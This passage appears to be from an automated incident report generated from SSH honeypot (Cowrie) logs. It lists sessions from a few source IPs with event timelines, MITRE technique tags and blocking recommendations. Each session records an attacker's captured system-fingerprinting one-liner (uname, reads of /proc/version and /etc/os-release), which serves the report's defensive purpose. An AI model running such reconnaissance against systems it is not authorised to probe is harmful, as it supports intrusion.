| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-05 05:46 |
| **Last Seen** | 2026-07-05 05:47 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 05:46:58` | `cowrie.session.connect` |
| `2026-07-05 05:46:59` | `cowrie.client.version` |
| `2026-07-05 05:46:59` | `cowrie.client.kex` |
| `2026-07-05 05:47:03` | `cowrie.login.success` |
| `2026-07-05 05:47:07` | `cowrie.session.params` |
| `2026-07-05 05:47:07` | `cowrie.command.input` |
| `2026-07-05 05:47:07` | `cowrie.command.input` |
| `2026-07-05 05:47:07` | `cowrie.command.input` |
| `2026-07-05 05:47:07` | `cowrie.command.input` |
| `2026-07-05 05:47:07` | `cowrie.command.input` |
| `2026-07-05 05:47:07` | `cowrie.command.success` |
| `2026-07-05 05:47:07` | `cowrie.command.input` |
| `2026-07-05 05:47:07` | `cowrie.command.input` |
| `2026-07-05 05:47:07` | `cowrie.command.input` |
| `2026-07-05 05:47:07` | `cowrie.command.input` |
| `2026-07-05 05:47:09` | `cowrie.log.closed` |
| `2026-07-05 05:47:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dbe4c62e9827

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-07-05 05:48 |
| **Last Seen** | 2026-07-05 05:48 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 05:48:06` | `cowrie.session.connect` |
| `2026-07-05 05:48:07` | `cowrie.client.version` |
| `2026-07-05 05:48:07` | `cowrie.client.kex` |
| `2026-07-05 05:48:11` | `cowrie.login.success` |
| `2026-07-05 05:48:14` | `cowrie.session.params` |
| `2026-07-05 05:48:14` | `cowrie.command.input` |
| `2026-07-05 05:48:14` | `cowrie.command.input` |
| `2026-07-05 05:48:14` | `cowrie.command.input` |
| `2026-07-05 05:48:14` | `cowrie.command.input` |
| `2026-07-05 05:48:14` | `cowrie.command.input` |
| `2026-07-05 05:48:14` | `cowrie.command.success` |
| `2026-07-05 05:48:14` | `cowrie.command.input` |
| `2026-07-05 05:48:14` | `cowrie.command.input` |
| `2026-07-05 05:48:14` | `cowrie.command.input` |
| `2026-07-05 05:48:14` | `cowrie.command.input` |
| `2026-07-05 05:48:15` | `cowrie.log.closed` |
| `2026-07-05 05:48:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d65cdbf30110

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-05 05:48 |
| **Last Seen** | 2026-07-05 05:48 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 05:48:21` | `cowrie.session.connect` |
| `2026-07-05 05:48:23` | `cowrie.client.version` |
| `2026-07-05 05:48:23` | `cowrie.client.kex` |
| `2026-07-05 05:48:27` | `cowrie.login.success` |
| `2026-07-05 05:48:31` | `cowrie.session.params` |
| `2026-07-05 05:48:31` | `cowrie.command.input` |
| `2026-07-05 05:48:31` | `cowrie.command.input` |
| `2026-07-05 05:48:31` | `cowrie.command.input` |
| `2026-07-05 05:48:31` | `cowrie.command.input` |
| `2026-07-05 05:48:31` | `cowrie.command.input` |
| `2026-07-05 05:48:31` | `cowrie.command.success` |
| `2026-07-05 05:48:31` | `cowrie.command.input` |
| `2026-07-05 05:48:31` | `cowrie.command.input` |
| `2026-07-05 05:48:31` | `cowrie.command.input` |
| `2026-07-05 05:48:31` | `cowrie.command.input` |
| `2026-07-05 05:48:33` | `cowrie.log.closed` |
| `2026-07-05 05:48:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-228ee03cbd5a

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-05 05:49 |
| **Last Seen** | 2026-07-05 05:49 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 05:49:35` | `cowrie.session.connect` |
| `2026-07-05 05:49:37` | `cowrie.client.version` |
| `2026-07-05 05:49:37` | `cowrie.client.kex` |
| `2026-07-05 05:49:43` | `cowrie.login.success` |
| `2026-07-05 05:49:46` | `cowrie.session.params` |
| `2026-07-05 05:49:46` | `cowrie.command.input` |
| `2026-07-05 05:49:47` | `cowrie.log.closed` |
| `2026-07-05 05:49:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1ee84f2fa025

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-07-05 05:49 |
| **Last Seen** | 2026-07-05 05:49 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 05:49:36` | `cowrie.session.connect` |
| `2026-07-05 05:49:37` | `cowrie.client.version` |
| `2026-07-05 05:49:37` | `cowrie.client.kex` |
| `2026-07-05 05:49:43` | `cowrie.login.success` |
| `2026-07-05 05:49:47` | `cowrie.session.params` |
| `2026-07-05 05:49:47` | `cowrie.command.input` |
| `2026-07-05 05:49:47` | `cowrie.command.input` |
| `2026-07-05 05:49:47` | `cowrie.command.input` |
| `2026-07-05 05:49:47` | `cowrie.command.input` |
| `2026-07-05 05:49:47` | `cowrie.command.input` |
| `2026-07-05 05:49:47` | `cowrie.command.success` |
| `2026-07-05 05:49:47` | `cowrie.command.input` |
| `2026-07-05 05:49:47` | `cowrie.command.input` |
| `2026-07-05 05:49:47` | `cowrie.command.input` |
| `2026-07-05 05:49:47` | `cowrie.command.input` |
| `2026-07-05 05:49:48` | `cowrie.log.closed` |
| `2026-07-05 05:49:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c432d52aa6dc

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-05 05:49 |
| **Last Seen** | 2026-07-05 05:49 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 05:49:45` | `cowrie.session.connect` |
| `2026-07-05 05:49:47` | `cowrie.client.version` |
| `2026-07-05 05:49:47` | `cowrie.client.kex` |
| `2026-07-05 05:49:50` | `cowrie.login.success` |
| `2026-07-05 05:49:54` | `cowrie.session.params` |
| `2026-07-05 05:49:54` | `cowrie.command.input` |
| `2026-07-05 05:49:54` | `cowrie.command.input` |
| `2026-07-05 05:49:54` | `cowrie.command.input` |
| `2026-07-05 05:49:54` | `cowrie.command.input` |
| `2026-07-05 05:49:54` | `cowrie.command.input` |
| `2026-07-05 05:49:54` | `cowrie.command.success` |
| `2026-07-05 05:49:54` | `cowrie.command.input` |
| `2026-07-05 05:49:54` | `cowrie.command.input` |
| `2026-07-05 05:49:54` | `cowrie.command.input` |
| `2026-07-05 05:49:54` | `cowrie.command.input` |
| `2026-07-05 05:49:56` | `cowrie.log.closed` |
| `2026-07-05 05:49:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-269a137b5336

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-07-05 05:51 |
| **Last Seen** | 2026-07-05 05:51 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 05:51:03` | `cowrie.session.connect` |
| `2026-07-05 05:51:04` | `cowrie.client.version` |
| `2026-07-05 05:51:04` | `cowrie.client.kex` |
| `2026-07-05 05:51:09` | `cowrie.login.success` |
| `2026-07-05 05:51:12` | `cowrie.session.params` |
| `2026-07-05 05:51:12` | `cowrie.command.input` |
| `2026-07-05 05:51:12` | `cowrie.command.input` |
| `2026-07-05 05:51:12` | `cowrie.command.input` |
| `2026-07-05 05:51:12` | `cowrie.command.input` |
| `2026-07-05 05:51:12` | `cowrie.command.input` |
| `2026-07-05 05:51:12` | `cowrie.command.success` |
| `2026-07-05 05:51:12` | `cowrie.command.input` |
| `2026-07-05 05:51:12` | `cowrie.command.input` |
| `2026-07-05 05:51:12` | `cowrie.command.input` |
| `2026-07-05 05:51:12` | `cowrie.command.input` |
| `2026-07-05 05:51:13` | `cowrie.log.closed` |
| `2026-07-05 05:51:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2b7df4d4cb77

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-05 05:51 |
| **Last Seen** | 2026-07-05 05:51 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 05:51:12` | `cowrie.session.connect` |
| `2026-07-05 05:51:13` | `cowrie.client.version` |
| `2026-07-05 05:51:13` | `cowrie.client.kex` |
| `2026-07-05 05:51:16` | `cowrie.login.success` |
| `2026-07-05 05:51:19` | `cowrie.session.params` |
| `2026-07-05 05:51:19` | `cowrie.command.input` |
| `2026-07-05 05:51:19` | `cowrie.command.input` |
| `2026-07-05 05:51:19` | `cowrie.command.input` |
| `2026-07-05 05:51:19` | `cowrie.command.input` |
| `2026-07-05 05:51:19` | `cowrie.command.input` |
| `2026-07-05 05:51:19` | `cowrie.command.success` |
| `2026-07-05 05:51:19` | `cowrie.command.input` |
| `2026-07-05 05:51:19` | `cowrie.command.input` |
| `2026-07-05 05:51:19` | `cowrie.command.input` |
| `2026-07-05 05:51:19` | `cowrie.command.input` |
| `2026-07-05 05:51:21` | `cowrie.log.closed` |
| `2026-07-05 05:51:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4fe1fa9f720e

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-07-05 05:52 |
| **Last Seen** | 2026-07-05 05:52 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 05:52:28` | `cowrie.session.connect` |
| `2026-07-05 05:52:29` | `cowrie.client.version` |
| `2026-07-05 05:52:29` | `cowrie.client.kex` |
| `2026-07-05 05:52:33` | `cowrie.login.success` |
| `2026-07-05 05:52:36` | `cowrie.session.params` |
| `2026-07-05 05:52:36` | `cowrie.command.input` |
| `2026-07-05 05:52:36` | `cowrie.command.input` |
| `2026-07-05 05:52:36` | `cowrie.command.input` |
| `2026-07-05 05:52:36` | `cowrie.command.input` |
| `2026-07-05 05:52:36` | `cowrie.command.input` |
| `2026-07-05 05:52:36` | `cowrie.command.success` |
| `2026-07-05 05:52:36` | `cowrie.command.input` |
| `2026-07-05 05:52:36` | `cowrie.command.input` |
| `2026-07-05 05:52:36` | `cowrie.command.input` |
| `2026-07-05 05:52:36` | `cowrie.command.input` |
| `2026-07-05 05:52:37` | `cowrie.log.closed` |
| `2026-07-05 05:52:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-67b68d5e66d8

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-05 05:52 |
| **Last Seen** | 2026-07-05 05:52 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 05:52:38` | `cowrie.session.connect` |
| `2026-07-05 05:52:39` | `cowrie.client.version` |
| `2026-07-05 05:52:39` | `cowrie.client.kex` |
| `2026-07-05 05:52:43` | `cowrie.login.success` |
| `2026-07-05 05:52:46` | `cowrie.session.params` |
| `2026-07-05 05:52:46` | `cowrie.command.input` |
| `2026-07-05 05:52:46` | `cowrie.command.input` |
| `2026-07-05 05:52:46` | `cowrie.command.input` |
| `2026-07-05 05:52:46` | `cowrie.command.input` |
| `2026-07-05 05:52:46` | `cowrie.command.input` |
| `2026-07-05 05:52:46` | `cowrie.command.success` |
| `2026-07-05 05:52:46` | `cowrie.command.input` |
| `2026-07-05 05:52:46` | `cowrie.command.input` |
| `2026-07-05 05:52:46` | `cowrie.command.input` |
| `2026-07-05 05:52:46` | `cowrie.command.input` |
| `2026-07-05 05:52:48` | `cowrie.log.closed` |
| `2026-07-05 05:52:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ce50b778654a

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-07-05 05:53 |
| **Last Seen** | 2026-07-05 05:54 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 05:53:50` | `cowrie.session.connect` |
| `2026-07-05 05:53:51` | `cowrie.client.version` |
| `2026-07-05 05:53:51` | `cowrie.client.kex` |
| `2026-07-05 05:53:55` | `cowrie.login.success` |
| `2026-07-05 05:53:58` | `cowrie.session.params` |
| `2026-07-05 05:53:58` | `cowrie.command.input` |
| `2026-07-05 05:53:58` | `cowrie.command.input` |
| `2026-07-05 05:53:58` | `cowrie.command.input` |
| `2026-07-05 05:53:58` | `cowrie.command.input` |
| `2026-07-05 05:53:58` | `cowrie.command.input` |
| `2026-07-05 05:53:58` | `cowrie.command.success` |
| `2026-07-05 05:53:58` | `cowrie.command.input` |
| `2026-07-05 05:53:58` | `cowrie.command.input` |
| `2026-07-05 05:53:58` | `cowrie.command.input` |
| `2026-07-05 05:53:58` | `cowrie.command.input` |
| `2026-07-05 05:53:59` | `cowrie.log.closed` |
| `2026-07-05 05:54:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-455b0de554da

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-05 05:54 |
| **Last Seen** | 2026-07-05 05:54 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 05:54:06` | `cowrie.session.connect` |
| `2026-07-05 05:54:07` | `cowrie.client.version` |
| `2026-07-05 05:54:07` | `cowrie.client.kex` |
| `2026-07-05 05:54:10` | `cowrie.login.success` |
| `2026-07-05 05:54:12` | `cowrie.session.params` |
| `2026-07-05 05:54:12` | `cowrie.command.input` |
| `2026-07-05 05:54:12` | `cowrie.command.input` |
| `2026-07-05 05:54:12` | `cowrie.command.input` |
| `2026-07-05 05:54:12` | `cowrie.command.input` |
| `2026-07-05 05:54:12` | `cowrie.command.input` |
| `2026-07-05 05:54:12` | `cowrie.command.success` |
| `2026-07-05 05:54:12` | `cowrie.command.input` |
| `2026-07-05 05:54:12` | `cowrie.command.input` |
| `2026-07-05 05:54:12` | `cowrie.command.input` |
| `2026-07-05 05:54:12` | `cowrie.command.input` |
| `2026-07-05 05:54:15` | `cowrie.log.closed` |
| `2026-07-05 05:54:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9d0b7c4f6a8e

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-07-05 05:55 |
| **Last Seen** | 2026-07-05 05:55 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 05:55:13` | `cowrie.session.connect` |
| `2026-07-05 05:55:13` | `cowrie.client.version` |
| `2026-07-05 05:55:13` | `cowrie.client.kex` |
| `2026-07-05 05:55:18` | `cowrie.login.success` |
| `2026-07-05 05:55:20` | `cowrie.session.params` |
| `2026-07-05 05:55:20` | `cowrie.command.input` |
| `2026-07-05 05:55:20` | `cowrie.command.input` |
| `2026-07-05 05:55:20` | `cowrie.command.input` |
| `2026-07-05 05:55:20` | `cowrie.command.input` |
| `2026-07-05 05:55:20` | `cowrie.command.input` |
| `2026-07-05 05:55:20` | `cowrie.command.success` |
| `2026-07-05 05:55:20` | `cowrie.command.input` |
